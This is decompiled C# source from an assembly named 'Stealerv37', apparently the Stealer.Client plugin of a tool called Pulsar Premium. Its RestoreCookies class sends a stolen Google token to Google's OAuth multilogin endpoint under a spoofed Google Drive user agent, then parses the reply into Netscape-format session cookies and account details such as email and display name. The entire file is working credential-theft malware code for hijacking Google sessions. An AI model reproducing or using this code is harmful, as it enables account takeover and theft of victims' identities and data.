// Decompiled with JetBrains decompiler
// Type: Intelix.Helper.RestoreCookies
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;

#nullable disable
namespace Intelix.Helper;

public static class RestoreCookies
{
  private static string SendPostRequest(string token)
  {
    try
    {
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create("https://accounts.google.com/oauth/multilogin?source=com.google.Drive");
      httpWebRequest.Method = "POST";
      httpWebRequest.ContentType = "application/x-www-form-urlencoded";
      httpWebRequest.Headers.Add("Authorization", "MultiBearer " + token);
      httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) com.google.Drive/6.0.230903 iSL/3.4 (gzip)\r\n";
      byte[] bytes = Encoding.UTF8.GetBytes("");
      using (Stream requestStream = httpWebRequest.GetRequestStream())
        requestStream.Write(bytes, 0, bytes.Length);
      using (HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse())
      {
        if (response.StatusCode == HttpStatusCode.OK)
        {
          using (StreamReader streamReader = new StreamReader(response.GetResponseStream()))
            return streamReader.ReadToEnd();
        }
      }
    }
    catch (Exception ex)
    {
    }
    return string.Empty;
  }

  public static string CRestore(string restore)
  {
    try
    {
      string str1 = RestoreCookies.SendPostRequest(restore);
      if (string.IsNullOrEmpty(str1))
        return string.Empty;
      string str2 = str1.Remove(0, 5);
      RestoreCookies.Root root = new RestoreCookies.Root();
      root.status = Regex.Match(str2, "\"status\":\"(.*?)\"").Groups[1].Value;
      root.cookies = RestoreCookies.ExtractCookies(str2);
      root.accounts = RestoreCookies.ExtractAccounts(str2);
      StringBuilder stringBuilder = new StringBuilder();
      foreach (RestoreCookies.Cookie cookie in root.cookies)
      {
        string str3 = string.IsNullOrEmpty(cookie.host) ? cookie.domain : cookie.host;
        string str4 = string.IsNullOrEmpty(str3) ? ".google.com" : str3;
        stringBuilder.AppendLine($"{str4}\tTRUE\t{cookie.path}\tFALSE\t{cookie.maxAge.ToString()}\t{cookie.name}\t{cookie.value}");
      }
      return stringBuilder.ToString();
    }
    catch
    {
    }
    return string.Empty;
  }

  private static List<RestoreCookies.Cookie> ExtractCookies(string json)
  {
    List<RestoreCookies.Cookie> cookies = new List<RestoreCookies.Cookie>();
    foreach (Capture match in Regex.Matches(json, "{(.*?)}"))
    {
      string input = match.Value;
      int result;
      RestoreCookies.Cookie cookie = new RestoreCookies.Cookie()
      {
        name = Regex.Match(input, "\"name\":\"(.*?)\"").Groups[1].Value,
        value = Regex.Match(input, "\"value\":\"(.*?)\"").Groups[1].Value,
        domain = Regex.Match(input, "\"domain\":\"(.*?)\"").Groups[1].Value,
        path = Regex.Match(input, "\"path\":\"(.*?)\"").Groups[1].Value,
        isSecure = Regex.IsMatch(input, "\"isSecure\":true"),
        isHttpOnly = Regex.IsMatch(input, "\"isHttpOnly\":true"),
        maxAge = int.TryParse(Regex.Match(input, "\"maxAge\":(\\d+)").Groups[1].Value, out result) ? result : 0,
        priority = Regex.Match(input, "\"priority\":\"(.*?)\"").Groups[1].Value,
        sameParty = Regex.Match(input, "\"sameParty\":\"(.*?)\"").Groups[1].Value,
        sameSite = Regex.Match(input, "\"sameSite\":\"(.*?)\"").Groups[1].Value,
        host = Regex.Match(input, "\"host\":\"(.*?)\"").Groups[1].Value
      };
      cookies.Add(cookie);
    }
    return cookies;
  }

  private static List<RestoreCookies.Account> ExtractAccounts(string json)
  {
    List<RestoreCookies.Account> accounts = new List<RestoreCookies.Account>();
    foreach (Capture match in Regex.Matches(json, "{(.*?)}"))
    {
      string input = match.Value;
      int result;
      RestoreCookies.Account account = new RestoreCookies.Account()
      {
        type = Regex.Match(input, "\"type\":\"(.*?)\"").Groups[1].Value,
        display_name = Regex.Match(input, "\"display_name\":\"(.*?)\"").Groups[1].Value,
        display_email = Regex.Match(input, "\"display_email\":\"(.*?)\"").Groups[1].Value,
        photo_url = Regex.Match(input, "\"photo_url\":\"(.*?)\"").Groups[1].Value,
        selected = Regex.IsMatch(input, "\"selected\":true"),
        default_user = Regex.IsMatch(input, "\"default_user\":true"),
        authuser = int.TryParse(Regex.Match(input, "\"authuser\":(\\d+)").Groups[1].Value, out result) ? result : 0,
        valid_session = Regex.IsMatch(input, "\"valid_session\":true"),
        obfuscated_id = Regex.Match(input, "\"obfuscated_id\":\"(.*?)\"").Groups[1].Value,
        is_verified = Regex.IsMatch(input, "\"is_verified\":true")
      };
      accounts.Add(account);
    }
    return accounts;
  }

  public class Account
  {
    public string type { get; set; }

    public string display_name { get; set; }

    public string display_email { get; set; }

    public string photo_url { get; set; }

    public bool selected { get; set; }

    public bool default_user { get; set; }

    public int authuser { get; set; }

    public bool valid_session { get; set; }

    public string obfuscated_id { get; set; }

    public bool is_verified { get; set; }
  }

  public class Cookie
  {
    public string name { get; set; }

    public string value { get; set; }

    public string domain { get; set; }

    public string path { get; set; }

    public bool isSecure { get; set; }

    public bool isHttpOnly { get; set; }

    public int maxAge { get; set; }

    public string priority { get; set; }

    public string sameParty { get; set; }

    public string sameSite { get; set; }

    public string host { get; set; }
  }

  public class Root
  {
    public string status { get; set; }

    public List<RestoreCookies.Cookie> cookies { get; set; }

    public List<RestoreCookies.Account> accounts { get; set; }
  }
}
